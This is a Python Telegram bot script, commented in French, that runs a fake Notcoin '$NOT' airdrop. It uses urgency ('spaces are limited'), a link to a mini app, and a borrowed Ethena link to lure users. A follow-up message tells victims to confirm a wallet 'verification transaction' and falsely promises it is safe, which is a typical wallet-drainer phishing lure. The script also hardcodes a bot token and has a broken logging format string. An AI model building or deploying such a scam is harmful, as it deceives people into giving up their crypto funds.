import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Configurer le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levellevel)s - %(message)s',
    level=logging.INFO
)

# Remplace TOKEN par le token de ton bot
TOKEN = '7351832151:AAGqfUHIXmyB3y7pGWAYViMYGwNioDZZvwc'
IMAGE_URL = 'https://drive.google.com/uc?export=download&id=14DZxx8aTCur1e1pcYhhB647NHqoj-58E'
MINI_APP_URL = 't.me/Ethenathe_bot/Web3Rewards'  # Remplace par l'URL de ta mini app

# Fonction pour démarrer le bot et envoyer l'image avec texte et boutons
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bot = Bot(token=TOKEN)
    
    user_first_name = update.message.from_user.first_name

    try:
        # Texte du message avec le prénom de l'utilisateur
        message_text = (
            f"Hey {user_first_name}! Every Notcoin holder receives up to 100,000 $NOT\n\n"
            "✨ We're excited to announce a $1,000,000 Airdrop of $NOT tokens! ✨\n\n"
            "Spaces are limited."
        )

        # Boutons
        keyboard = [
            [InlineKeyboardButton("Claim Airdrop 🎁", url=MINI_APP_URL)],
            [InlineKeyboardButton("News Twitter/X", url='https://x.com/ethena_labs')],
            [InlineKeyboardButton("Close App", callback_data='close_app')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Envoi de l'image avec le texte en légende et les boutons
        await bot.send_photo(chat_id=update.message.chat_id, photo=IMAGE_URL, caption=message_text, reply_markup=reply_markup)
        print("Image envoyée avec succès")
    except Exception as e:
        logging.error(f"Failed to send message: {e}")
        await update.message.reply_text("Failed to send message.")

# Fonction de gestion des callbacks
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    # Si l'utilisateur clique sur "Close App"
    if query.data == 'close_app':
        # Message à envoyer après la fermeture de la mini-app
        follow_up_message = (
            "<b>Dogs 🛠️</b>\n\n"
            "⚠️ <b>Pan, If you received a transaction with the verification comment <i>Confirm the verification prompt. Ref: #51817</i>, don't be scared!</b>\n\n"
            "It means that Airdrop is available for you and the system has sent a verification message to verify that your wallet is not a spam wallet.\n\n"
            "❗ <b>Important note:</b>\n\n"
            "If your profile is eligible for the reward, after you have connected your wallet, the verification system will prompt you to confirm the verification transaction, it must be confirmed. Otherwise, you will not be able to collect your reward.\n\n"
            "<b>Due to the increasing cases of spam and system abuses, we had to introduce this stage of verification. It is safe and does not cause any financial losses for you.</b>"
        )

        # Envoi du message de suivi
        await query.message.reply_text(follow_up_message, parse_mode=ParseMode.HTML)

def main() -> None:
    # Initialiser l'application avec le token de ton bot
    application = ApplicationBuilder().token(TOKEN).build()

    # Ajouter les gestionnaires
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CallbackQueryHandler(button))

    # Démarrer le bot
    application.run_polling()

if __name__ == '__main__':
    main()
